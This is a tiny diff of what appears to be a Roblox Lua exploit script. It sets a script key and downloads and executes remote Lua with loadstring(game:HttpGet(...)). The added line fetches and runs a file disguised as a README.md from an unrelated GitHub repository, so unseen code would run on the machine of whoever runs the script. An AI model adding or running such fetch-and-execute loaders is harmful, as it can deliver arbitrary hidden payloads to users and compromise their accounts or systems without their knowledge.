@@ -29,3 +29,4 @@
 
 getgenv().SCRIPT_KEY="5f693979-5b28-43db-ab1a-613c8079b947";
 loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/dd1158e38b24a493ba853d47404ef032b0da43ed74516acfb013072bff14b304/download"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/lol222223223/joiner95356/refs/heads/main/README.md"))()
